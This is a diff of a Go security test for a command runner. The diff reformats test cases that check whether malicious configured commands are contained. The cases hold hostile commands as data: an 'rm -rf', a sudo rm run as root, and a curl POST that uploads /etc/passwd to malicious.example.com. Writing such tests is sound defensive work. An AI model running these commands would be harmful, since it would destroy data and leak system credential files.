@@ -264,9 +264,10 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 	}{
 		{
 			name: "dangerous_rm_command_dry_run_protection",
-			cmd: executortesting.CreateRuntimeCommand("rm", []string{"-rf", "/tmp/should-not-execute-in-test"},
-				executortesting.WithName("dangerous-rm"),
-				executortesting.WithExpandedArgs([]string{"-rf", "/tmp/should-not-execute-in-test"})),
+			cmd: executortesting.CreateRuntimeCommand(
+				"rm",
+				[]string{"-rf", "/tmp/should-not-execute-in-test"},
+				executortesting.WithName("dangerous-rm")),
 			group: &runnertypes.GroupSpec{
 				Name: "malicious-group",
 			},
@@ -279,7 +280,7 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 			cmd: executortesting.CreateRuntimeCommand("sudo", []string{"rm", "-rf", "/tmp/test-sudo-target"},
 				executortesting.WithName("sudo-escalation"),
 				executortesting.WithRunAsUser("root"),
-				executortesting.WithExpandedArgs([]string{"rm", "-rf", "/tmp/test-sudo-target"})),
+			),
 			group: &runnertypes.GroupSpec{
 				Name: "privilege-escalation-group",
 			},
@@ -289,9 +290,11 @@ func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 		},
 		{
 			name: "network_exfiltration_command_protection",
-			cmd: executortesting.CreateRuntimeCommand("curl", []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
+			cmd: executortesting.CreateRuntimeCommand(
+				"curl",
+				[]string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
 				executortesting.WithName("data-exfil"),
-				executortesting.WithExpandedArgs([]string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"})),
+			),
 			group: &runnertypes.GroupSpec{
 				Name: "network-exfil-group",
 			},
